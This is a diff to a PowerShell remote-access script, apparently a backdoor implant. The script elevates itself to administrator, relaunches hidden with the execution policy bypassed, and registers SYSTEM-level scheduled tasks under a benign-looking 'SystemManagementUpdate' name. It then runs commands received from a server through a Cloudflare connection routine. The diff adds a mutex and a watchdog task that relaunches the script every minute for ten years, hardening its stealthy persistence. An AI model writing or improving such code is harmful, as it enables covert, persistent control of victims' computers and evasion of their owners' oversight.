@@ -7,10 +7,15 @@ $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' fo
 $maxChunkBytes = 32000  # cap per-chunk size
 $clientId = "$($env:COMPUTERNAME)-$($env:USERNAME)"  # unique identifier sent to server on every request
 $taskName = "SystemManagementUpdate"
+$watchdogTaskName = "SystemManagementUpdateWatchdog"
 $selfPath = $PSCommandPath
 if (-not $selfPath) { $selfPath = $MyInvocation.MyCommand.Path }
 if (-not $selfPath) { $selfPath = (Get-Process -Id $PID).Path }
 $isExePayload = ($selfPath -and [System.IO.Path]::GetExtension($selfPath).ToLower() -eq ".exe")
+$mutexName = "Global\SystemManagementUpdateMutex"
+$createdNew = $false
+$script:singleInstanceMutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)
+if (-not $createdNew) { exit }
 
 # --- Self-elevate to admin and relaunch hidden ---
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -23,17 +28,28 @@ if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Adm
     exit
 }
 
-# --- Persistence ---
+# --- Persistence (skip if tasks already exist — avoids redundant re-registration) ---
 $action = if ($isExePayload) {
     New-ScheduledTaskAction -Execute $selfPath
 } else {
     New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
 }
-$startupTrigger = New-ScheduledTaskTrigger -AtStartup
-$logonTrigger = New-ScheduledTaskTrigger -AtLogOn
 $settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($startupTrigger, $logonTrigger) -Settings $settings -Principal $principal -Force | Out-Null
+if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
+    $startupTrigger = New-ScheduledTaskTrigger -AtStartup
+    $logonTrigger = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($startupTrigger, $logonTrigger) -Settings $settings -Principal $principal -Force | Out-Null
+}
+if (-not (Get-ScheduledTask -TaskName $watchdogTaskName -ErrorAction SilentlyContinue)) {
+    $watchdogAction = if ($isExePayload) {
+        New-ScheduledTaskAction -Execute $selfPath
+    } else {
+        New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
+    }
+    $watchdogTrigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 3650)
+    Register-ScheduledTask -TaskName $watchdogTaskName -Action $watchdogAction -Trigger $watchdogTrigger -Settings $settings -Principal $principal -Force | Out-Null
+}
 
 # --- Logging ---
 function Write-Log {
@@ -134,7 +150,10 @@ function Invoke-CommandStreaming {
     $timeoutLabel = if ($noTimeout) { "no-timeout" } else { "${Timeout}s" }
     $runspace = Get-PersistentRunspace
     try {
-        $cwd = [powershell]::Create().AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
+        $cwdPs = [powershell]::Create()
+        $cwdPs.Runspace = $runspace
+        $cwd = $cwdPs.AddScript('(Get-Location).Path').Invoke() | ForEach-Object { $_.ToString() }
+        $cwdPs.Dispose()
         if (-not $cwd) { $cwd = (Get-Location).Path }
     } catch { $cwd = (Get-Location).Path }
     $header = "PS $cwd> $Command [$timeoutLabel]`n"
@@ -248,6 +267,8 @@ function Connect-Cloudflare {
 
                 if ($command -eq "exit") {
                     Write-Log "Exit command received. Shutting down."
+                    try { $script:singleInstanceMutex.ReleaseMutex() } catch {}
+                    try { $script:singleInstanceMutex.Dispose() } catch {}
                     break
                 }
 
